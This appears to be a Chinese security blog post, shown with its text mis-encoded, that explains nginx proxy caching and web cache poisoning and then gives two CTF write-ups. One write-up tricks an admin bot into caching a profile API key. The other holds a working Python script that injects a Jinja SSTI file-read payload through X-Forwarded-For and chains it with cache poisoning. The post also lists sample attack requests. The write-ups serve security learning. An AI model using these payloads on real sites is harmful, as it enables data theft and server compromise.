---
title: "ç¼“å­˜æœºåˆ¶å­¦ä¹ &ç¼“å­˜æŠ•æ¯’"
description: "ç¼“å­˜æŠ•æ¯’ï¼ˆCache Poisoningï¼‰æ˜¯ä¸€ç§æ”»å‡»æŠ€æœ¯ï¼Œæ”»å‡»è€…é€šè¿‡ç‰¹å®šæ‰‹æ®µè®©ç¼“å­˜ç³»ç»Ÿå­˜å‚¨æ¶æ„æˆ–æ•æ„Ÿçš„å“åº”å†…å®¹ï¼Œç„¶åå…¶ä»–ç”¨æˆ·è®¿é—®æ—¶ä¼šè·å–åˆ°è¿™äº›è¢«æ±¡æŸ“çš„ç¼“å­˜å†…å®¹"
date: "2025-09-03"
tags:
  - "nginx"
  - "ç¼“å­˜"
  - "æŠ•æ¯’"
  - "bx"
  - "è„šæœ¬"
authors:
  - "bx"
draft: false              # è®¾ä¸º true åˆ™ä¸ºè‰ç¨¿
slug: "nginx-cache-poisoning"          # éšæœºURLå­—ç¬¦ä¸²
---
<meta name="referrer" content="no-referrer">

# Nginxç¼“å­˜æŠ•æ¯’
## åŸºæœ¬å­¦ä¹ 
ç¼“å­˜æŠ•æ¯’ï¼ˆCache Poisoningï¼‰æ˜¯ä¸€ç§æ”»å‡»æŠ€æœ¯ï¼Œæ”»å‡»è€…é€šè¿‡ç‰¹å®šæ‰‹æ®µè®©ç¼“å­˜ç³»ç»Ÿå­˜å‚¨æ¶æ„æˆ–æ•æ„Ÿçš„å“åº”å†…å®¹ï¼Œç„¶åå…¶ä»–ç”¨æˆ·è®¿é—®æ—¶ä¼šè·å–åˆ°è¿™äº›è¢«"æ±¡æŸ“"çš„ç¼“å­˜å†…å®¹



ä½†æ˜¯æˆ‘ä»¬éœ€è¦å…ˆäº†è§£ä¸ºä»€ä¹ˆéœ€è¦**ç¼“å­˜è¿™ä¸ªæœºåˆ¶**ï¼Œ

### nginx ç¼“å­˜æœºåˆ¶
>  ã€Œå…¨å±€ç¼“å­˜ã€ä¸€èˆ¬æŒ‡ **èƒ½è¢«å¤šä¸ªç”¨æˆ· / å¤šä¸ªä¼šè¯å…±äº«çš„ç¼“å­˜**ï¼Œä¸å±€é™äºæœ¬åœ°æœºå™¨  
>

ä¸»è¦åˆ† **åå‘ä»£ç†ç¼“å­˜** å’Œ **é™æ€æ–‡ä»¶ç¼“å­˜** ä¸¤ç±»  

#### åå‘ä»£ç†ç¼“å­˜ï¼ˆproxy_cacheï¼‰
è¿™æ˜¯æœ€å¸¸ç”¨çš„ç¼“å­˜æ¨¡å¼ï¼Œç”¨äºç¼“å­˜ **åç«¯åº”ç”¨çš„å“åº”**ã€‚

**ä¸»è¦å·¥ä½œæµç¨‹ï¼š**

1. ç”¨æˆ·è¯·æ±‚ `/index.html`
2. Nginx æŸ¥æ‰¾æœ¬åœ°ç¼“å­˜ç›®å½•æ˜¯å¦å·²æœ‰ç¼“å­˜æ–‡ä»¶
    - å¦‚æœæœ‰ä¸”æœªè¿‡æœŸ â†’ ç›´æ¥è¿”å›ç¼“å­˜æ–‡ä»¶ï¼ˆå‘½ä¸­ï¼‰
    - å¦‚æœæ²¡æœ‰ â†’ å°†è¯·æ±‚è½¬å‘ç»™åç«¯åº”ç”¨ï¼Œæ‹¿åˆ°å“åº”
3. Nginx å°†å“åº”ä¿å­˜åˆ°æœ¬åœ°ç¼“å­˜ç›®å½•ï¼Œå¹¶è¿”å›ç»™ç”¨æˆ·
4. åç»­åŒæ ·è¯·æ±‚ â†’ ç›´æ¥å‘½ä¸­ç¼“å­˜

ä¸€ä¸ªä¾‹å­å¦‚ä¸‹

```nginx
proxy_cache_path /var/cache/nginx levels=1:2 keys_zone=mycache:10m inactive=60m max_size=1g;

server {
  location / {
    proxy_pass http://backend;
    proxy_cache mycache;
    proxy_cache_key "$scheme$proxy_host$request_uri";
    proxy_cache_valid 200 302 10m;
    proxy_cache_valid 404 1m;
  }
}
```

proxy_cache_path å®šä¹‰ç¼“å­˜è·¯å¾„ã€å¤§å°ã€è¶…æ—¶è§„åˆ™

keys_zone ç”¨äºç¼“å­˜ç´¢å¼•ï¼ˆå­˜åœ¨å†…å­˜é‡Œï¼‰

proxy_cache_key å®šä¹‰ç¼“å­˜é”®ï¼ˆé»˜è®¤ç”¨ $ scheme $proxy_host$request_uriï¼‰

proxy_cache_valid å®šä¹‰ä¸åŒçŠ¶æ€ç çš„ç¼“å­˜æ—¶é—´



#### ç¼“å­˜é”®
> è®¾è®¡æ€è·¯æ˜¯ï¼š åªç¼“å­˜å¿…è¦ç»´åº¦ï¼Œé¿å… Cookieã€User-Agent è¿™ç§å¯å˜å› ç´ æ±¡æŸ“ç¼“å­˜
>

è¿™ä¸ªç¼“å­˜é”®æˆ‘ä»¬éœ€è¦æ·±å…¥ä¸€ä¸‹

é»˜è®¤æƒ…å†µï¼Œ Nginx çš„ç¼“å­˜é”®æ˜¯ï¼š  

```nginx
$scheme$proxy_host$request_uri
```

+ `$scheme`ï¼šè¯·æ±‚åè®®ï¼ˆhttp æˆ– httpsï¼‰
+ `$proxy_host`ï¼šä»£ç†çš„ä¸»æœºåï¼ˆæ¥è‡ª proxy_passï¼‰
+ `$request_uri`ï¼šå®Œæ•´è¯·æ±‚ URIï¼ˆè·¯å¾„+æŸ¥è¯¢å‚æ•°ï¼‰

æ‰€ä»¥ç»“æœå°±æ˜¯ï¼Œä¸åŒçš„åè®®ã€ä¸åŒçš„ hostã€ä¸åŒçš„å‚æ•°ï¼Œéƒ½ä¼šå½¢æˆä¸åŒçš„ key

è¿˜å¯ä»¥æ›´ç»†åŒ–ä»€ä¹ˆçš„ï¼Œæ¯”å¦‚è¯´

```nginx
proxy_cache_key "$scheme$request_method$host$request_uri";
```

åŠ äº†ä¸€ä¸ª`$request_method`ï¼Œæ„å‘³ç€åŒä¸€ä¸ª URL çš„ GET å’Œ POST ä¼šæœ‰ä¸åŒçš„ç¼“å­˜ã€‚  

æˆ‘ä»¬çŸ¥é“äº†è¿™ä¸ªï¼Œæ¥ç€å°±æ˜¯ç¼“å­˜å‘½ä¸­è¿™ä¸ªåè¯äº†



#### ç¼“å­˜å‘½ä¸­
è‹±æ–‡ï¼šcache hit

å½“å®¢æˆ·ç«¯å‘èµ·ä¸€ä¸ªè¯·æ±‚æ—¶ï¼ŒNginx ä¼šå…ˆç®—å‡ºè¿™ä¸ªè¯·æ±‚å¯¹åº”çš„ **ç¼“å­˜é”®ï¼ˆcache keyï¼‰**ï¼Œç„¶åå»æœ¬åœ°ç¼“å­˜ç›®å½•é‡Œæ‰¾æœ‰æ²¡æœ‰å¯¹åº”çš„ç¼“å­˜æ–‡ä»¶ï¼š

+ **å‘½ä¸­ç¼“å­˜ï¼ˆCache Hitï¼‰**  
æ‰¾åˆ°äº†ç›¸åŒçš„ç¼“å­˜é”®ï¼Œå¯¹åº”çš„ç¼“å­˜å†…å®¹å­˜åœ¨è€Œä¸”è¿˜æ²¡è¿‡æœŸ â†’ ç›´æ¥æŠŠç¼“å­˜è¿”å›ç»™å®¢æˆ·ç«¯ã€‚  
ğŸ‘‰ ä¸éœ€è¦è®¿é—®åç«¯æœåŠ¡å™¨ï¼Œé€Ÿåº¦å¿«ï¼Œå‡å°‘æºç«™å‹åŠ›ã€‚
+ **æœªå‘½ä¸­ç¼“å­˜ï¼ˆCache Missï¼‰**  
æ²¡æ‰¾åˆ°ç¼“å­˜ï¼Œæˆ–è€…ç¼“å­˜å·²è¿‡æœŸ/è¢«æ¸…ç† â†’ Nginx å»æºç«™è·å–æœ€æ–°æ•°æ®ï¼Œå†å­˜åˆ°ç¼“å­˜é‡Œã€‚



å…³äºè¿™ä¸ªå‘½ä¸­é—®é¢˜ï¼Œä¹Ÿä¼šæœ‰è®¸å¤šé—®é¢˜ï¼Œæ¯”å¦‚è¯´ç¼“å­˜æ±¡æŸ“ï¼Œç¼“å­˜ç©¿é€è¿™äº›ï¼Œåç»­å†å­¦ä¹ 



#### ç¼“å­˜å‚¨å­˜é—®é¢˜
>  Nginx ç¼“å­˜å¹¶ä¸æ˜¯å•çº¯æ”¾åœ¨æŸä¸€ä¸ªåœ°æ–¹ï¼Œè€Œæ˜¯ â€œå†…å­˜ç´¢å¼• + ç£ç›˜æ–‡ä»¶â€ ç»“åˆ
>

**å†…å­˜éƒ¨åˆ†ï¼ˆç´¢å¼•åŒºï¼‰**

+ ç”± `proxy_cache_path` é‡Œçš„ `keys_zone=mycache:10m` å®šä¹‰ã€‚
+ è¿™ 10m å†…å­˜é‡Œå­˜æ”¾çš„æ˜¯ ç¼“å­˜é”® â†’ ç£ç›˜æ–‡ä»¶è·¯å¾„ â†’ å…ƒæ•°æ®ï¼ˆæ¯”å¦‚è¿‡æœŸæ—¶é—´ã€å¤§å°ï¼‰ã€‚
+ ç±»ä¼¼ä¸€ä¸ªâ€œç›®å½•ç´¢å¼•â€ï¼Œç”¨æ¥å¿«é€Ÿåˆ¤æ–­æŸä¸ªè¯·æ±‚çš„ cache key æ˜¯å¦å·²ç»ç¼“å­˜è¿‡ã€‚



**ç£ç›˜éƒ¨åˆ†ï¼ˆç¼“å­˜æ–‡ä»¶ï¼‰**

çœŸæ­£çš„ç¼“å­˜å†…å®¹ï¼ˆHTTP å“åº” Header + Bodyï¼‰ä¼šå†™åˆ°ç£ç›˜ç›®å½•ï¼Œæ¯”å¦‚ï¼š

```plain
proxy_cache_path /var/cache/nginx levels=1:2 keys_zone=mycache:10m inactive=60m max_size=1g;
```

â†’ `/var/cache/nginx` å°±æ˜¯ç£ç›˜å­˜æ”¾ç¼“å­˜æ–‡ä»¶çš„åœ°æ–¹ã€‚

+ `levels=1:2`ï¼šè¯´æ˜ä¼šç”¨å“ˆå¸Œåˆ†çº§ç›®å½•å­˜å‚¨ï¼Œé¿å…å•ç›®å½•æ–‡ä»¶å¤ªå¤šï¼Œæ¯”å¦‚ï¼š

```plain
/var/cache/nginx/a/3f/9c8123c7b1.cache
```

+ æ–‡ä»¶å†…å®¹åŒ…æ‹¬ï¼š
    - HTTP å“åº”å¤´ï¼ˆContent-Typeã€Status Code ç­‰ï¼‰
    - å“åº”ä½“ï¼ˆHTMLã€JSONã€å›¾ç‰‡â€¦â€¦ï¼‰





### æŠ•æ¯’é—®é¢˜
ç¼“å­˜æŠ•æ¯’çš„æœ¬è´¨æ˜¯ï¼š  
è®© **æ¶æ„è¯·æ±‚çš„ç»“æœ** è¢«å½“æˆ"æ­£å¸¸ç»“æœ"ç¼“å­˜ä¸‹æ¥ï¼Œåç»­æ‰€æœ‰ç”¨æˆ·è®¿é—®æ—¶éƒ½ç›´æ¥å‘½ä¸­è¿™ä¸ªå¸¦æ¯’ç¼“å­˜ã€‚  

æ‰€ä»¥ä¸€é€šåˆ†æä¸‹æ¥ï¼Œéœ€è¦ä¸¤ä¸ªè¦ç‚¹

1. ç¼“å­˜æ˜¯å…¨å±€å…±äº«çš„
2. ç¼“å­˜é”®è®¾è®¡æœ‰é—®é¢˜

#### ç¼“å­˜æŠ•æ¯’åˆ†ç±»
> æ ¹æ®æ”»å‡»æ‰‹æ®µå’Œç›®æ ‡çš„ä¸åŒï¼Œç¼“å­˜æŠ•æ¯’å¯ä»¥åˆ†ä¸ºå‡ ä¸ªä¸»è¦ç±»å‹
>

**1. Web Cache Poisoningï¼ˆWebç¼“å­˜æŠ•æ¯’ï¼‰**

è¿™æ˜¯æœ€ç»å…¸çš„ç¼“å­˜æŠ•æ¯’æ”»å‡»ï¼Œé€šè¿‡æ“æ§HTTPè¯·æ±‚è®©ç¼“å­˜ç³»ç»Ÿå­˜å‚¨æ¶æ„å“åº”ã€‚

+ **åŸç†**ï¼šåˆ©ç”¨ç¼“å­˜é”®å’Œå®é™…å¤„ç†é€»è¾‘çš„å·®å¼‚
+ **ç›®æ ‡**ï¼šè®©æ¶æ„å†…å®¹è¢«ç¼“å­˜å¹¶å½±å“å…¶ä»–ç”¨æˆ·
+ **å¸¸è§åœºæ™¯**ï¼šCDNç¼“å­˜ã€åå‘ä»£ç†ç¼“å­˜

**2. HTTP Header Pollutionï¼ˆHTTPå¤´éƒ¨æ±¡æŸ“ï¼‰**

é€šè¿‡æ³¨å…¥æ¶æ„HTTPå¤´éƒ¨æ¥å½±å“ç¼“å­˜è¡Œä¸ºæˆ–åº”ç”¨é€»è¾‘ã€‚

+ **X-Forwarded-Hostæ±¡æŸ“**ï¼šä¿®æ”¹Hostå¤´å½±å“ç¼“å­˜é”®
+ **X-Original-URLæ±¡æŸ“**ï¼šç»•è¿‡è·¯ç”±é€»è¾‘
+ **è‡ªå®šä¹‰å¤´éƒ¨æ³¨å…¥**ï¼šå½±å“åº”ç”¨çš„ä¸šåŠ¡é€»è¾‘

**3. Parameter Pollutionï¼ˆå‚æ•°æ±¡æŸ“ï¼‰**

åˆ©ç”¨URLå‚æ•°çš„è§£æå·®å¼‚è¿›è¡Œæ”»å‡»ã€‚

+ **HTTP Parameter Pollution (HPP)**ï¼šåŒåå‚æ•°çš„ä¸åŒè§£ææ–¹å¼
+ **æŸ¥è¯¢å‚æ•°é¡ºåº**ï¼šä¸åŒçš„å‚æ•°æ’åºå¯èƒ½å½±å“ç¼“å­˜é”®
+ **ç¼–ç å·®å¼‚**ï¼šURLç¼–ç çš„ä¸ä¸€è‡´å¤„ç†

**4. Method Override Pollutionï¼ˆæ–¹æ³•è¦†ç›–æ±¡æŸ“ï¼‰**

é€šè¿‡HTTPæ–¹æ³•è¦†ç›–å¤´éƒ¨æ¥æ”¹å˜è¯·æ±‚çš„å®é™…å¤„ç†æ–¹å¼ã€‚

```http
POST /api/user HTTP/1.1
X-HTTP-Method-Override: DELETE
```

#### æ”»å‡»å‘é‡è¯¦è§£
> é™¤äº†è·¯å¾„æ··æ·†ï¼Œè¿˜æœ‰å¾ˆå¤šå…¶ä»–çš„æ”»å‡»å‘é‡å€¼å¾—å…³æ³¨
>

**1. HTTPå¤´éƒ¨æ”»å‡»å‘é‡**

```http
# Hostå¤´éƒ¨æ±¡æŸ“
GET /profile HTTP/1.1
Host: evil.com
X-Forwarded-Host: target.com

# è‡ªå®šä¹‰å¤´éƒ¨æ³¨å…¥
GET /api/data HTTP/1.1
X-Custom-Header: <script>alert(1)</script>

```

**2. å‚æ•°æ±¡æŸ“æ”»å‡»å‘é‡**

```http
# åŒåå‚æ•°æ±¡æŸ“
GET /search?q=normal&q=malicious HTTP/1.1

# ç¼–ç å·®å¼‚åˆ©ç”¨
GET /path%2f..%2fadmin HTTP/1.1
GET /path/..%2fadmin HTTP/1.1
```

**3. ç¼“å­˜é”®æ“æ§**

```nginx
# å¦‚æœç¼“å­˜é”®åªåŒ…å«è·¯å¾„ï¼Œä¸åŒ…å«æŸäº›å¤´éƒ¨
proxy_cache_key "$scheme$request_method$host$request_uri";

# æ”»å‡»è€…å¯ä»¥é€šè¿‡å…¶ä»–å¤´éƒ¨å½±å“å“åº”å†…å®¹
# ä½†ç¼“å­˜é”®ç›¸åŒï¼Œå¯¼è‡´æ±¡æŸ“
```

**4. æ—¶é—´çª—å£æ”»å‡»**

ã€‚ã€‚ã€‚

#### é˜²æŠ¤æªæ–½
> ğŸ’¡ **è®°ä½**ï¼šç¼“å­˜æŠ•æ¯’çš„æ ¸å¿ƒåœ¨äº"ä¿¡ä»»è¾¹ç•Œ"çš„æ¨¡ç³Šã€‚å½“ç¼“å­˜ç³»ç»Ÿä¿¡ä»»äº†ä¸åº”è¯¥ä¿¡ä»»çš„ç”¨æˆ·è¾“å…¥æ—¶ï¼Œæ”»å‡»å°±å¯èƒ½å‘ç”Ÿã€‚
>



## **å…·ä½“åœºæ™¯--**
### CDNio
> Race against time! Tweak CDN and caching magic to make web pages load at lightning speed. Minimize cache misses and watch your load times drop!  
ä¸æ—¶é—´èµ›è·‘ï¼è°ƒæ•´ CDN å’Œç¼“å­˜é­”æ³•ï¼Œè®©ç½‘é¡µä»¥é—ªç”µèˆ¬çš„é€Ÿåº¦åŠ è½½ã€‚æœ€å°åŒ–ç¼“å­˜æœªå‘½ä¸­ï¼Œçœ‹ç€ä½ çš„åŠ è½½æ—¶é—´ä¸‹é™ï¼
>

è¿›å…¥é¡µé¢ï¼ŒHTB çš„é¢˜ç›®é¡µé¢éƒ½å¾ˆå¥½çœ‹

![](https://cdn.nlark.com/yuque/0/2025/png/42994824/1756908945467-2fba6133-25a9-4045-a1df-4bf1c189d7d8.png)

ä»£ç æŸ¥çœ‹ä¸€ä¸‹ï¼Œflag åœ¨ api_key é‡Œé¢

![](https://cdn.nlark.com/yuque/0/2025/png/42994824/1756910227124-f3cd2b41-72be-4622-83dc-68acce1706f2.png)

é¡ºç€è¿™ä¸ª api_key æ‰¾åˆ°ä¸»è¦æ¼æ´é€»è¾‘

```plsql
@main_bp.route('/<path:subpath>', methods=['GET'])
@jwt_required
def profile(subpath):
    
    if re.match(r'.*^profile', subpath): # Django perfection

        decoded_token = request.decoded_token

        username = decoded_token.get('sub')
        if not username:
            return jsonify({"error": "Invalid token payload!"}), 401

        conn = get_db_connection()

        user = conn.execute(
            "SELECT id, username, email, api_key, created_at, password FROM users WHERE username = ?",
            (username,)
        ).fetchone()
        conn.close()
        
        if user:
            return jsonify({
                "id": user["id"],
                "username": user["username"],
                "email": user["email"],
                "password": user["password"],
                "api_key": user["api_key"],
                "created_at": user["created_at"]
            }), 200

        else:
            return jsonify({"error": "User not found"}), 404
        
    else:
        return jsonify({"error": "No match"}), 404
```

è¿™é¢˜å…¶å®é‡ç‚¹åœ¨äº nginx ç¼“å­˜é—®é¢˜

å…·ä½“çœ‹ä¸‹é¢çš„é…ç½®

```javascript
user nobody;
worker_processes 1;
pid /run/nginx.pid;

events {
    worker_connections 768;
}

http {
    server_tokens off;

    include /etc/nginx/mime.types;
    default_type application/octet-stream;

    proxy_cache_path /var/cache/nginx keys_zone=cache:10m max_size=1g inactive=60m use_temp_path=off;

    server {
        listen 1337; 
        
        server_name _;  

        location ~* \.(css|js|png|jpg|jpeg|gif|ico|svg|woff|woff2|ttf|eot)$ {
            proxy_cache cache;
            proxy_cache_valid 200 3m;
            proxy_cache_use_stale error timeout updating;
            expires 3m;
            add_header Cache-Control "public";

            proxy_pass http://unix:/tmp/gunicorn.sock;
            proxy_set_header Host $host;
            proxy_set_header X-Real-IP $remote_addr;
            proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
            proxy_set_header X-Forwarded-Proto $scheme;
            
        }

        location / {
            proxy_pass http://unix:/tmp/gunicorn.sock;
            proxy_set_header Host $host;
            proxy_set_header X-Real-IP $remote_addr;
            proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
            proxy_set_header X-Forwarded-Proto $scheme;
            
        }

        access_log /var/log/nginx/access.log;
        error_log /var/log/nginx/error.log;
    }
}

```

è¿™é‡Œå…³é”®ç‚¹åœ¨äºï¼Œé™æ€èµ„æºï¼ˆå¦‚ .css æ–‡ä»¶ï¼‰ä¼šè¢«ç¼“å­˜ 3 åˆ†é’Ÿ

```plsql
location ~* \.(css|js|png|jpg|jpeg|gif|ico|svg|woff|woff2|ttf|eot)$ {
    proxy_cache cache;
    proxy_cache_valid 200 3m;
    proxy_cache_use_stale error timeout updating;
    expires 3m;
    add_header Cache-Control "public";
}
```

æˆ‘ä»¬å®é™…ä¸Šæ˜¯å…ˆåˆ†æ flask ä¸­è“å›¾çš„è·¯ç”±

è¿™ä¸ª bot æ–‡ä»¶- è®¿é—®ç”¨æˆ·æŒ‡å®šçš„ URI ï¼Œç®¡ç†å‘˜çš„å“åº”ä¼šè¢«ç¼“å­˜

```plsql
@bot_bp.route('/visit', methods=['POST'])
@jwt_required
def visit():

    data = request.get_json()

    uri = data.get('uri')
    
    if not uri:
        return jsonify({"message": "URI is required"}), 400

    bot_thread(uri)

    return jsonify({"message": f"Visiting URI: {uri}"}), 200
```

ä¸€åˆ‡éƒ½è¯´çš„é€šäº†ï¼Œæˆ‘ä»¬æœ€ç»ˆå½“ Botï¼ˆç®¡ç†å‘˜ï¼‰è®¿é—® profile/1.css æ—¶ï¼š

è§¦å‘ç¼“å­˜æŠ•æ¯’ ï¼š

+ å‘ /visit å‘é€POSTè¯·æ±‚ï¼ŒURIä¸º profile/1.css
+ Botï¼ˆadminèº«ä»½ï¼‰è®¿é—® GET /profile/1.css
+ ç”±äºè·¯å¾„åŒ¹é…æˆåŠŸï¼ŒFlaskè¿”å› 200å“åº” ï¼ŒåŒ…å«adminçš„æ•æ„Ÿä¿¡æ¯ï¼š

```plain
{
  "id": 1,
  "username": "admin", 
  "email": "admin@htb.local",
  "password": "...",
  "api_key": "HTB{f4k3_fl4g_f0r_t35t1ng}",  // è¿™å°±æ˜¯
  flagï¼
  "created_at": "..."
}
```

+ Nginxå°†è¿™ä¸ª 200å“åº”ç¼“å­˜ åˆ° /var/cache/nginx/

ç”±äºæ˜¯æœ‰ç™»å½•çš„ç³»ç»Ÿéœ€è¦æå‰æ³¨å†Œè·å–å¯¹åº”çš„ jwt

![](https://cdn.nlark.com/yuque/0/2025/png/42994824/1756909595664-77ac8cef-27cc-4c8c-9f4d-133c74dc660f.png)

å¸¦ç€æˆ‘ä»¬çš„Authorization: Bearer å»è®¿é—®ä¸€ä¸ª uri

```plsql
POST /visit HTTP/1.1
Host: 94.237.55.43:49952
Cache-Control: max-age=0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Language: zh-US,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-CN;q=0.6
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJieDMzNjYxIiwiaWF0IjoxNzU2OTA5MzM0LCJleHAiOjE3NTY5OTU3MzR9.0O_U6hBqKVesbgq9sk6UpBFKLz04g-gHWECAmu99Jfs
Referer: http://94.237.55.43:49952/register
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1
Content-Type: application/json

{
 "uri":"profile/1.css"
}
```

![](https://cdn.nlark.com/yuque/0/2025/png/42994824/1756909553406-44334edd-aa95-494d-8173-8d97ce5cdc5a.png)

è®¿é—®æˆ‘ä»¬åˆšåˆšç¼“å­˜çš„

```plsql
GET /profile/1.css HTTP/1.1
Host: 94.237.55.43:49952
Cache-Control: max-age=0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Language: zh-US,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-CN;q=0.6
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJieDMzNjYxIiwiaWF0IjoxNzU2OTA5MzM0LCJleHAiOjE3NTY5OTU3MzR9.0O_U6hBqKVesbgq9sk6UpBFKLz04g-gHWECAmu99Jfs
Referer: http://94.237.55.43:49952/register
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1
```

å¾—åˆ° flag

![](https://cdn.nlark.com/yuque/0/2025/png/42994824/1756909513886-a47f389f-2f9b-4e94-af53-0800269c4bcb.png)

å¾—åˆ° flag





### best-profile
> oops, itâ€™s my profile
>

ä¸»è¦æ˜¯ï¼Œnginxç¼“å­˜æœºåˆ¶å’ŒFlask ProxyFixçš„äº¤äº’

ä»£ç å®¡è®¡ï¼Œåœ¨app.pyä¸­

```python
@app.after_request
def set_last_ip(response):
    if current_user.is_authenticated:
        current_user.last_ip = request.remote_addr  # ä»X-Forwarded-Forè·å–
        db.session.commit()
    return response

@app.route("/ip_detail/<string:username>", methods=["GET"])
def route_ip_detail(username):
    res = requests.get(f"http://127.0.0.1/get_last_ip/{username}")  # å†…éƒ¨è¯·æ±‚
    last_ip = res.text  # è·å–å®Œæ•´HTMLå“åº”
    template = f"""
    <h1>IP Detail</h1>

    <div>{last_ip}</div>    <!-- ç›´æ¥æ’å…¥ç”¨æˆ·å¯æ§å†…å®¹ -->
    <p>Country:{country}</p>

    """
    return render_template_string(template)  # SSTIè§¦å‘ç‚¹
```

åŒæ—¶åœ¨nginxé…ç½®ä¸­ï¼Œå¯ä»¥åˆ©ç”¨nginxç¼“å­˜æŠ•æ¯’

```python
location ~ .*\.(gif|jpg|jpeg|png|bmp|swf)$ {
    proxy_ignore_headers Cache-Control Expires Vary Set-Cookie;
    proxy_pass http://127.0.0.1:5000;
    proxy_cache static;
    proxy_cache_valid 200 302 30d;  # ç¼“å­˜30å¤©ï¼
}
```

åœ¨ç™»å½•æ—¶æŠ•å‘é€sstiï¼Œè®¿é—®/get_last_ip/test.jpgï¼Œè§¦å‘nginxç¼“å­˜

åˆ©ç”¨ç¼“å­˜æŠ•æ¯’ï¼šè®¿é—®/ip_detail/test.jpgï¼ŒFlaskä»è¢«æŠ•æ¯’çš„ç¼“å­˜è·å–æ•°æ®

```python
import requests

def main():
    username = "bx33661.jpg"
    base_url = "http://61.147.171.103:64936"
    password = "123456"

    session = requests.Session()

    headers = {
        "X-Forwarded-For": "{%set chr=lipsum.__globals__.__builtins__.chr%}{{lipsum.__globals__.__builtins__.open(chr(47)+dict(flag=a)|first|lower).read()}}"
    }

    registration_data = {
        "username": username,
        "password": password,
        "bio": "bx",
        "submit": "Sign Up"
    }

    login_data = {
        "username": username,
        "password": password,
        "submit": "Log In"
    }

    try:
        print("=== Registration ===")
        register_response = session.post(f"{base_url}/register", data=registration_data)
        print(register_response.text)

        print("\n=== Login ===")
        login_response = session.post(f"{base_url}/login", headers=headers, data=login_data)
        print(login_response.text)

        print("\n=== Last IP ===")
        last_ip_response = session.get(f"{base_url}/get_last_ip/{username}")
        print(last_ip_response.text)

        print("\n=== IP Details ===")
        ip_detail_response = session.get(f"{base_url}/ip_detail/{username}")
        print(ip_detail_response.text)

    except requests.exceptions.RequestException as e:
        print(f"Request error: {e}")
    except Exception as e:
        print(f"Unexpected error: {e}")

if __name__ == "__main__":
    main()

```